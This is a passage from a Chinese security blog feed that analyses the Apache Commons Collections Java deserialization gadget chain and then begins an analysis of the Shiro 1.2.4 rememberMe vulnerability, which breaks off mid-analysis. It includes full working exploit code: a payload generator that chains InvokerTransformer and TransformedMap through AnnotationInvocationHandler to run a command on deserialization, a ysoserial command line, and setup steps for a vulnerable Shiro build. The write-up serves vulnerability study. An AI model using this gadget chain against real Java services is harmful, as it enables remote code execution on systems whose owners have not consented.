title="InvokerTransformer"></a>InvokerTransformer</h2><p>该类有一个transformer函数，触发了反射机制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这个函数有个构造函数，会让我们传入三个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们可以创建一个InvokerTransformer对象，利用transform函数来执行命令，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line"></span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new String[] &#123;&quot;calc.exe&quot;&#125;).transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>transform函数中传入我们的Runtime实例化对象，构造函数的参数传入我们要调用的函数，参数类型和参数。</p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/InvokerTransformer.png" alt></p><p>但是在开发的过程中应该不会让transform函数直接传入Runtime对象，所以我们需要想办法构造出Runtime.getRuntime()实例化对象。</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>该类也有transform方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>将传入的对象原封不动的返回，估计这里是为了格式吧~</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>该类的transform很有趣：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = this.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>会将传入的对象作为下一个transform函数的参数，这里我们就可以实例化我们的Runtime对象了，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line">        transformedChain.transform(transformers);</span><br><span class="line">        //new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new String[] &#123;&quot;calc.exe&quot;&#125;).transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/ChainedTransformer.png" alt></p><p>我们可以构造一个transformerChain对象进行序列化，然后readObject进行反序列化，但是需要调用transform方法，除非开发这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InputStream iii = request.getInputStream();</span><br><span class="line">ObjectInputStream in = new ObjectInputStream(iii);</span><br><span class="line">obj = in.readObject();</span><br><span class="line">obj.transform(Runtime.getRuntime());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure></p><p>很显然不会有人写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure></p><p>这个时候我们就要想办法找能够调用transform的类</p><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>Map类是存储键值对的数据结构，Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种变换，只要调用decorate()函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">        return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>使用TransformedMap通过执行setValue方法会触发transform方法，打到我们先前想要的效果，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map.Entry elEntry = ( Map.Entry ) outerMap.entrySet().iterator().next();</span><br><span class="line">        elEntry.setValue(&quot;hahah&quot;);</span><br></pre></td></tr></table></figure></p><p>我们在setValue这里设置断点进行调试，来看看如何从setValues方法调用了transform方法的：<br><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/setValue.png" alt><br>跟进checkSetValue方法：<br><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/checkSetValue" alt><br>发现了我们熟悉的面孔</p><p>那么我们就从需要执行transform方法，转到了需要执行setValue方法</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>在jdk1.7当中有我们合适的类，会调用我们的setValue方法，并且重写了readObject方法。</p><p>构造函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;//var1满足这个if条件时</span><br><span class="line">        this.type = var1;//传入的var1到this.type</span><br><span class="line">        this.memberValues = var2;//我们的map传入this.memberValues</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>readobject复写函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        //默认反序列化</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();//</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();//遍历map迭代器</span><br><span class="line">            String var6 = (String)var5.getKey();//获取key的名称</span><br><span class="line">            Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();//获取map的value</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这里我们就看到了我们想要的setValue方法啦，想办法构造可以调用。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>这里就很简单，写一个反序列化的代码，然后我们反序列化的类容就是我们构造好的恶意对象。</p><p>攻击者端代码，将我们的恶意对象写入到payload.bin文件当中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        File f = new File(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们来查看这个二进制文件内容，用linux下的hexdump命令：<br><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/bin.png" alt></p><p>查看到里面有我们的恶意代码</p><p>服务器端代码（这里懒得找环境了，直接写个读取反序列化的就行），反序列化我们payload.bin文件中的对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        //从文件payload.bin中读取数据</span><br><span class="line">        FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectInputStream fin = new ObjectInputStream(fi);</span><br><span class="line">        //服务端反序列化</span><br><span class="line">        String s = (String) fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/fi.png" alt><br>成功弹窗。</p><p>当然我们也可以用ysoserial来输出我们的恶意对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;calc.exe&quot; &gt; payload.bin</span><br></pre></td></tr></table></figure></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>其实之前有几个问题没想通的，但是后来跟着DEBUG以后就很清楚了，还是要多调试呀！</p><p>整体来说就是，readObject的时候我们的恶意对象由于重写了readObject方法，会调用我们构造好的恶意代码来进行攻击，对于最近流行的Shiro、CAS反序列化都是这样的。</p><p>比方说Shiro就是Cookie中的RememberMe传进去之后会进行反序列化，由于有AES加密，我们需要猜解密钥，然后将加密之后的序列化恶意对象发送过去，服务器端就会解密，进行反序列化。</p><p>说的很粗糙，也不晓得有没有错误呀。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a><br><a href="https://xz.aliyun.com/t/7031#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-9</a><br><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce" target="_blank" rel="noopener">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce</a><br><a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实漏洞原理都看懂了，但是去看其他框架的反序列化漏洞还是有点迷糊，还是做下笔记叭！&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Apache Commons Collec
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>shiro 1.2.4反序列化漏洞分析</title>
    <link href="http://sherlocz.github.io/2020/08/02/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://sherlocz.github.io/2020/08/02/shiro-1-2-4反序列化漏洞分析/</id>
    <published>2020-08-02T09:36:45.000Z</published>
    <updated>2020-08-10T14:24:12.956Z</updated>
    
    <content type="html"><![CDATA[<p>官方issue:<br><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先下载有漏洞版本的shiro<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</span><br></pre></td></tr></table></figure></p><p>解压后进入<strong>simple/web</strong>目录，修改其中的<strong>pom.xml</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">            &lt;!--  这里需要将jstl设置为1.2 --&gt;</span><br><span class="line">            &lt;version&gt;1.2&lt;/version&gt; </span><br><span class="line">            &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">&lt;!--  加入我们的漏洞组件 --&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure></p><p>然后再<strong>pom.xml</strong>下运行 <strong>mvn install</strong> 命令进行打包，在target目录下会生成 <strong>samples-web-1.2.4.war</strong><br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/install.png" alt><br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/target.png" alt></p><p>将我们的war包放在tomcat目录下，启动tomcat，访问地址：<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/tomcat.png" alt></p><p>环境搭建成go0o0ong</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>整个漏洞点如下：<br>cookie -&gt; base64解码 -&gt; AES解密 -&gt; 反序列化</p><p>首先来看看我们的cookie，登陆之后抓包，获取rememberMe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=0DOaI2x90RcR5SP6rCnGX1cT2ZUVv4Mq2iH3/6ZNvUuZkWDgPvsvJ5nTlO69Z3u2X6Wtb+7a7B+D0D9KILfHdtQHro9fUqiWtjkUeP2Y8ca7nbY9JPCcaEBkExk8+thVsa2DCCL9NpL+WQTxGz/UXSpevdEIU4RKmO98G5qEgI0vIaAbtLwb1FLuIm2x2JBqmqV+LEpE/Ag4mEhP99lfHhPIMK5ZLt1z7F9iFv2XKLU4tdx7LDqQwcEpNgIny5EfplmnUWUoJQoR7hOjaa0FDILqz6AXbKw5CqymWQho4TAsnYrnBpAw5iBNLB9b5Z7zux8wSFsbc8atLBAG16qiepj0mIf4GeNMoSMWJTEVYu9gdkJxeKkgXACa8L8M73a1lcH2OD1ye8N9i6fi6T/Te+VeJjB1+wknwMzvO/v4M+L+JZ6A0GXx0V6Z60U2E/7Tdytz2EJoLwzXnzstjAHZOL2OXLF9gGxN+kfRom7iTOci6eytPaP9OsPomLEMxrDs</span><br></pre></td></tr></table></figure></p><p>这个应该是base64加密后的内容，利用python解密以二进制的格式进行保存，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">b4 = &quot;0DOaI2x90RcR5SP6rCnGX1cT2ZUVv4Mq2iH3/6ZNvUuZkWDgPvsvJ5nTlO69Z3u2X6Wtb+7a7B+D0D9KILfHdtQHro9fUqiWtjkUeP2Y8ca7nbY9JPCcaEBkExk8+thVsa2DCCL9NpL+WQTxGz/UXSpevdEIU4RKmO98G5qEgI0vIaAbtLwb1FLuIm2x2JBqmqV+LEpE/Ag4mEhP99lfHhPIMK5ZLt1z7F9iFv2XKLU4tdx7LDqQwcEpNgIny5EfplmnUWUoJQoR7hOjaa0FDILqz6AXbKw5CqymWQho4TAsnYrnBpAw5iBNLB9b5Z7zux8wSFsbc8atLBAG16qiepj0mIf4GeNMoSMWJTEVYu9gdkJxeKkgXACa8L8M73a1lcH2OD1ye8N9i6fi6T/Te+VeJjB1+wknwMzvO/v4M+L+JZ6A0GXx0V6Z60U2E/7Tdytz2EJoLwzXnzstjAHZOL2OXLF9gGxN+kfRom7iTOci6eytPaP9OsPomLEMxrDs&quot;</span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(b4)</span><br><span class="line"></span><br><span class="line">with open(&quot;rem.bin&quot;,&quot;w+&quot;) as f:</span><br><span class="line">f.write(temp)</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/bin.png" alt><br>我们查看二进制内容，并没有发现反序列化的特征，由于漏洞中出现了AES加密，这里猜测应该要进行解密才能看见，跟进代码。我们需要找到AES的加密方式(mode)，加密的秘钥(key)以及加密的向量(iv)</p><p>官方文档里有写问题类为CookieRememberMeManager：<br><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p><p>其中有一个getRememberedSerializedIdentity方法，看起来和我们的RememberMe以及反序列化都有关系，我们在这个函数下断点</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/1.png" alt><br>成功截断，继续跟踪代码，依然还是这个方法中，我们看到将我们requests中的RememberMe赋值给了base64字符串，然后将这个字符串进行解码，解码之后变成了byte格式。<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/2.png" alt></p><p>继续跟踪代码，来到了getRememberedPrincipals函数，调用了convertBytesToPrincipals函数，继续跟进</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/3.png" 